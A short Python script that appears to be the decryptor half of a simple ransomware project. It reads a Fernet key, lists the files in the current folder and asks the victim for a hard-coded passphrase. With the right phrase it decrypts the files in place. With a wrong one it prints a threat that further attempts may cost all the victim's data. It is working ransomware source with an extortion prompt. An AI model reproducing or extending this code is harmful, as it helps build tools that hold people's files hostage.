#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
        if file == 'rans.py' or file == 'thekey.key' or file == 'decrypt_rans.py':
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)

with open('thekey.key', 'rb') as key:
                secretkey = key.read()


while True:
	secretphrase = 'badabum12'
	user_phrase = input('Enter the secret phrase to decrypt all you files\n')
	phrase = 'Congrats! All files was encrypted! Enjoy!'

	if user_phrase == secretphrase:
		for file in files:
        		with open(file, 'rb') as thefile:
                		contents = thefile.read()
        		contents_decrypted =  Fernet(secretkey).decrypt(contents)
        		with open(file, 'wb') as thefile:
                		thefile.write(contents_decrypted)
		print(phrase)
		break 
	else:
		print('Dont kidding me! Next iteration maybe will cost all your data')
		continue
